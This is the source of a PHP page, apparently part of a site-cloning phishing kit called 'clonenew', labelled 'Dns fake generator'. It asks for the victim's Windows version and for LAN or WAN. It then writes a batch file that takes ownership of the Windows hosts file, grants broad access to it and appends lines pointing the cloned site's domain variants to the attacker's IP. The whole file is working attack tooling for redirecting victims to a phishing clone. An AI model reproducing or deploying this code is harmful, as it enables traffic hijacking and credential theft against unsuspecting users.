<html>
<head>

    <title> clonenew </title>
  
  <link rel="icon" type="image/jpg" href="/css/clone_title.jpg" />

 <link rel="stylesheet" type="text/css" href="css/dns.css">



<style>

input[type='radio'] 
{ 
transform: scale(2); 
}

</style>


</head>




<body id="body">


    <div class="shell-wrap">
  <p class="shell-top-bar"> Dns fake generator </p>
  
 
      <br><br><br><br>


      <div align="center">
    <form action="" method="post">

   <select name="fake_dns" id="select_dns" required>
     <option selected disabled> Operating System of victim </option>
      <optgroup label="Microsoft windows">
    <option value ="windows xp">   Windows XP  </option>
    <option value ="windows 7">    Windows 7  </option>
    <option value ="windows 8">    Windows 8  </option>
    <option value ="windows 8.1">  Windows 8.1  </option>
    <option value ="windows 10">   Windows 10  </option>
      </optgroup>
  </select>
    
       <br><br><br>


      <input type="radio" name="network" value="Lan" checked required> Lan
         &nbsp; &nbsp; &nbsp; 
      <input type="radio" name="network" value="Wan"> Wan


     <br><br><br>

   <input type="submit" name="submit_dns" value="Fake dns generator" id="submit">

  </form>
    </div>

  
       <br>   
 

      <div align="center">
        <a href="/">
    <input type="button" value="No fake dns(Normal attack)" id="submit">
         </a>
      </div>
 
   
    

  <div id="footer">
   <img src="/css/clone_diagram.jpg" height="300" width="600">
   </div>



 


</body>
</html>




<?php



 clearstatcache();

  session_start();


  require_once('class_tools.php');

  if (class_exists('INPUT_DATA_AVAILABLE')) 
    {
    $obj_dns = new INPUT_DATA_AVAILABLE;
      



   if (isset($_POST['submit_dns']))
      {
      $fake_dns   =  $obj_dns-> SAFE_DATA_ENTER($_POST['fake_dns']);
      $network    =  $obj_dns-> SAFE_DATA_ENTER($_POST['network']);
 
       if($fake_dns == true)
        {




         // Get path from operating system 



        if($fake_dns == "windows xp")
           {
            $operating_system_path =  "C:\WINDOWS\System32\drivers";
             }


        else if($fake_dns == "windows 7")
             {
              $operating_system_path =  "C:\Windows\System32\drivers";
              }


       else if($fake_dns == "windows 8")
             {
              $operating_system_path =  "C:\Windows\System32\Drivers";
              }


        else if($fake_dns == "windows 8.1")
             {
              $operating_system_path =  "C:\Windows\System32\Drivers";
              }

  

        else if($fake_dns == "windows 10")
             {
              $operating_system_path =  "C:\Windows\System32\drivers";
              }
 



              if (isset($_SESSION['site_hack']))             
                {

            $ipv4 = trim(shell_exec('shell/./my_ipv4.sh'));

            $PublicIP = trim(shell_exec("shell/./my_public_ip.sh")); 




              // Get network type for attack

              if ($network == "Lan")
               {
                $MyIP = $ipv4;
                 }


             else  if ($network == "Wan")
                 {
                  $MyIP = $PublicIP;
                   }




            $dns = '"' .$_SESSION['site_hack'] .'"';


            $dns_0 = str_replace ("https","http",$dns);

            $dns_1 = str_replace ("https://","",$dns);
 
            $dns_2 = str_replace ("https://www.","",$dns);
 
            $dns_3 = str_replace ("com","gr",$dns_1);

            $dns_4 = str_replace ("com","gr",$dns_2);


            $dns_5 = str_replace ("https","http",$dns);
 
            $dns_6 = str_replace ("https://www.","http://",$dns);
 
            $dns_7 = str_replace ("com","gr",$dns_5);

            $dns_8 = str_replace ("com","gr",$dns_6);



            $hosts = fopen("export/l_win.bat", "w") or die("Unable to open file!");
            $lines_hosts = '@echo off' 
                    .PHP_EOL .'Takeown /f' ." "  ."$operating_system_path"  .'\etc\hosts'
                    .PHP_EOL .'icacls'     ." "  ."$operating_system_path"  .'\etc\hosts'  .'/grant Administrator:F'
                    .PHP_EOL .'icacls'     ." "  ."$operating_system_path"  .'\etc\hosts'  .'/grant Administrators:F'
                    .PHP_EOL .'icacls'     ." "  ."$operating_system_path"  .'\etc\hosts'  .'/grant SYSTEM:F'
                    .PHP_EOL .'icacls'     ." "  ."$operating_system_path"  .'\etc\hosts'  .'/grant "Authenticated Users":F'
                    .PHP_EOL .'icacls'     ." "  ."$operating_system_path"  .'\etc\hosts'  .'/grant "domain\users":R'
                    .PHP_EOL ."echo $MyIP"  ." "  .trim($dns,  '"')   ." "  .'>>'  ." "  ."$operating_system_path"  .'\etc\hosts'
                    .PHP_EOL ."echo $MyIP"  ." "  .trim($dns_0, '"')  ." "  .'>>'  ." "  ."$operating_system_path"  .'\etc\hosts' 
                    .PHP_EOL ."echo $MyIP"  ." "  .trim($dns_1, '"')  ." "  .'>>'  ." "  ."$operating_system_path"  .'\etc\hosts'
                    .PHP_EOL ."echo $MyIP"  ." "  .trim($dns_2, '"')  ." "  .'>>'  ." "  ."$operating_system_path"  .'\etc\hosts'
                    .PHP_EOL ."echo $MyIP"  ." "  .trim($dns_3, '"')  ." "  .'>>'  ." "  ."$operating_system_path"  .'\etc\hosts'
                    .PHP_EOL ."echo $MyIP"  ." "  .trim($dns_4, '"')  ." "  .'>>'  ." "  ."$operating_system_path"  .'\etc\hosts'
                    .PHP_EOL ."echo $MyIP"  ." "  .trim($dns_5, '"')  ." "  .'>>'  ." "  ."$operating_system_path"  .'\etc\hosts'
                    .PHP_EOL ."echo $MyIP"  ." "  .trim($dns_6, '"')  ." "  .'>>'  ." "  ."$operating_system_path"  .'\etc\hosts'
                    .PHP_EOL ."echo $MyIP"  ." "  .trim($dns_7, '"')  ." "  .'>>'  ." "  ."$operating_system_path"  .'\etc\hosts'
                    .PHP_EOL ."echo $MyIP"  ." "  .trim($dns_8, '"')  ." "  .'>>'  ." "  ."$operating_system_path"  .'\etc\hosts'
                    .PHP_EOL .'exit'; 



            fwrite($hosts, $lines_hosts);
            fclose($hosts);

           chmod("/var/www/clonenew/export/l_win.bat", 0777);


              } // end of isset session site hack






          if (isset($_SESSION['site_ready']))
              {


            $ipv4 = trim(shell_exec('shell/./my_ipv4.sh'));

            $publicIP = trim(shell_exec("shell/./my_public_ip.sh")); 




              // Get network type for attack

              if ($network == "Lan")
               {
                $MyIP = $ipv4;
                 }


             else  if ($network == "Wan")
                 {
                  $MyIP = $publicIP;
                   }

 

            $dns_ready = '"' .$_SESSION['site_ready'] .'"';

            $dns_ready_0 = str_replace ("https","http",$dns_ready);

            $dns_ready_1 = str_replace ("https://","",$dns_ready);
 
            $dns_ready_2 = str_replace ("https://www.","",$dns_ready);
 
            $dns_ready_3 = str_replace ("com","gr",$dns_ready_1);

            $dns_ready_4 = str_replace ("com","gr",$dns_ready_2);


            $dns_ready_5 = str_replace ("https","http",$dns_ready);
 
            $dns_ready_6 = str_replace ("https://www.","http://",$dns_ready);
 
            $dns_ready_7 = str_replace ("com","gr",$dns_ready_5);

            $dns_ready_8 = str_replace ("com","gr",$dns_ready_6);



         $hosts_ready = fopen("export/l_win.bat", "w") or die("Unable to open file!");
         $lines_hosts_ready = '@echo off' 
             .PHP_EOL .'Takeown /f' ." "  ."$operating_system_path"
             .PHP_EOL .'icacls'     ." "  ."$operating_system_path"  .'\etc\hosts'  .'/grant Administrator:F'
             .PHP_EOL .'icacls'     ." "  ."$operating_system_path"  .'\etc\hosts'  .'/grant Administrators:F'
             .PHP_EOL .'icacls'     ." "  ."$operating_system_path"  .'\etc\hosts'  .'/grant SYSTEM:F'
             .PHP_EOL .'icacls'     ." "  ."$operating_system_path"  .'\etc\hosts'  .'/grant "Authenticated Users":F'
             .PHP_EOL .'icacls'     ." "  ."$operating_system_path"  .'\etc\hosts'  .' /grant "domain\users":R'
             .PHP_EOL ."echo $MyIP"  ." "   .trim($dns_ready, '"')     ." "  .'>>'  ." "  ."$operating_system_path"  .'\etc\hosts'
             .PHP_EOL ."echo $MyIP"  ." "   .trim($dns_ready_0, '"')   ." "  .'>>'  ." "  ."$operating_system_path"  .'\etc\hosts'
             .PHP_EOL ."echo $MyIP"  ." "   .trim($dns_ready_1, '"')   ." "  .'>>'  ." "  ."$operating_system_path"  .'\etc\hosts'
             .PHP_EOL ."echo $MyIP"  ." "   .trim($dns_ready_2, '"')   ." "  .'>>'  ." "  ."$operating_system_path"  .'\etc\hosts'
             .PHP_EOL ."echo $MyIP"  ." "   .trim($dns_ready_3, '"')   ." "  .'>>'  ." "  ."$operating_system_path"  .'\etc\hosts'
             .PHP_EOL ."echo $MyIP"  ." "   .trim($dns_ready_4, '"')   ." "  .'>>'  ." "  ."$operating_system_path"  .'\etc\hosts'
             .PHP_EOL ."echo $MyIP"  ." "   .trim($dns_ready_5, '"')   ." "  .'>>'  ." "  ."$operating_system_path"  .'\etc\hosts'
             .PHP_EOL ."echo $MyIP"  ." "   .trim($dns_ready_6, '"')   ." "  .'>>'  ." "  ."$operating_system_path"  .'\etc\hosts'
             .PHP_EOL ."echo $MyIP"  ." "   .trim($dns_ready_7, '"')   ." "  .'>>'  ." "  ."$operating_system_path"  .'\etc\hosts'
             .PHP_EOL ."echo $MyIP"  ." "   .trim($dns_ready_8, '"')   ." "  .'>>'  ." "  ."$operating_system_path"  .'\etc\hosts'
             .PHP_EOL .'exit';
         fwrite($hosts_ready, $lines_hosts_ready);
         fclose($hosts_ready);



        chmod("/var/www/clonenew/export/l_win.bat", 0777);
            
             } // end of isset session site_ready





  echo "<script type='text/javascript'>alert('Fake dns for $fake_dns generated');
         </script>";
          echo ("<script>location.href='/'</script>");
         } 
 

       } // end of submit dns



   } // end if isset of class



?>
